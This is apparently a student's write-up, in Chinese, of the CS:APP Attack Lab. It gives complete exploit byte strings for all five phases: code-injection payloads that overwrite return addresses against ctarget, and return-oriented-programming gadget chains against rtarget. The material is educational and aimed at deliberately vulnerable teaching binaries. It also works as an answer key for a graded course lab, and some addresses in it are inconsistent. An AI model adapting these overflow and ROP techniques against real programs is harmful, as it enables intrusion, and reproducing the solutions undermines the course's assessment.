# Attack Lab
### lab地址： [CS:APP3e Student Site](http://csapp.cs.cmu.edu/3e/students.html)
## 实验文件组成
    README.txt: A file describing the contents of the directory  

    ctarget: An executable program vulnerable to code-injection attacks  

    rtarget: An executable program vulnerable to return-oriented-programming attacks  

    cookie.txt: An 8-digit hex code that you will use as a unique identifier in your attacks.  

    farm.c: The source code of your target’s “gadget farm,” which you will use in generating return-oriented
    programming attacks.

    hex2raw: A utility to generate attack strings.
## 常用指令
    cat answerk | ./hex2raw | ./ctarget -q（不加-q 不能运行）
    objdump -d xx.o > xx 反汇编指令
    gcc -c xx.i 将汇编语言转换为机器语言    

## answer1:
第一个任务只需要把栈填充40个地址然后覆盖原来的返回地址，通过汇编语言翻译为机器地址

    31 32 33 34 35 36 37 38 39 30
    31 32 33 34 35 36 37 38 39 30
    31 32 33 34 35 36 37 38 39 30
    31 32 33 34 35 36 37 38 39 30
    c0 17 40 00 00 00 00 00  
## answer2:
第二个任务需要我们自己编写汇编代码，把cookie传入寄存器rdi中:  

    movq $0x59b997fa , %rdi
    pushq $0x004017c0
    retq  
然后把这个栈帧的返回地址改为栈顶  

    gcc -c answer2.s //之后生成answer2.o
    objdump -d answer2.o >> answer2.s //获得字节序列  

最终的字节序列为

    48 c7 c7 fa 97 b9 59
    68 ec 17 40 00
    c3
    30 30 30 30 30 30
    30 30 30 30 30 30
    30 30 30 30 30 30
    30 30 30 30 30 30 30 30 30
    78 dc 61 55 00 00 00 00
## answer3:
第三个任务需要把cookie存入到栈中，把地址传给rdi  

因为在这里后面的hexmatch 和strncmp会覆盖getbuf中的memory  
而观察test过程的栈空间是没有被利用的，所以我们可以覆盖调用函数的栈空间来存储注入代码字符串  
buf栈顶的位置在0x5561dc78 栈底0x5561dca0 所以跳过保存地址的8个字节  
我们存储字符串的位置就在0x5561dca8  
touch3()地址 $0x004018fa  
注入代码

    mov $0x5561dca8 , %rdi
    pushq   $0x004018fa
    retq
最终的字节序列：

    48 c7 c7 a8 dc 61 55 
    68 fa 18 40 00
    c3
    30 30 30 30 30 30
    30 30 30 30 30 30
    30 30 30 30 30 30
    30 30 30 30 30 30 30 30 30
    78 dc 61 55 00 00 00 00
    35 39 62 39 39 37 66 61
## answer4:
因为**栈随机化**，因此不可以通过栈地址来注入执行代码  
为了达到movq $0x59b997fa,%rdi  我们利用原来的代码碎片
首先填充40个空的字节，把原来的返回地址改为pop %rax代码地址  
我们查询到pop %rax 字节序列为58 90 
找到代码碎片地址 0x004019ab  
然后填充8个字节cookie ,再返回到代码碎片 movq %rax,%rdi ,对应地址为0x004889c7
![栈结构](https://github.com/JasonJ2021/CSAPP/blob/main/AttackLab/picture/answer4.jpg)
最终的字节序列为

    30 30 30 30 30 30 30 30 30 30
    30 30 30 30 30 30 30 30 30 30
    30 30 30 30 30 30 30 30 30 30
    30 30 30 30 30 30 30 30 30 30
    ab 19 40 00 00 00 00 00
    fa 97 b9 59 00 00 00 00
    c5 19 40 00 00 00 00 00
    ec 17 40 00 00 00 00 00

## answer5:
最后一个任务实现与phase_3差不多，栈结构如下：
![栈结构](https://github.com/JasonJ2021/CSAPP/blob/main/AttackLab/picture/answer5.jpg)
最终的字节序列为

    51 51 51 51 51 51 51 51 51 51
    51 51 51 51 51 51 51 51 51 51
    51 51 51 51 51 51 51 51 51 51
    51 51 51 51 51 51 51 51 51 51
    ad 1a 40 00 00 00 00 00
    d8 19 40 00 00 00 00 00
    a2 19 40 00 00 00 00 00
    fa 18 40 00 00 00 00 00
    31 31 31 31 31 31 31 31 31 31
    31 31 31 31 31 31 31 31 31 31
    31 31 31 31 31 31 31 31 31 31
    31
    35 39 62 39 39 37 66 61 00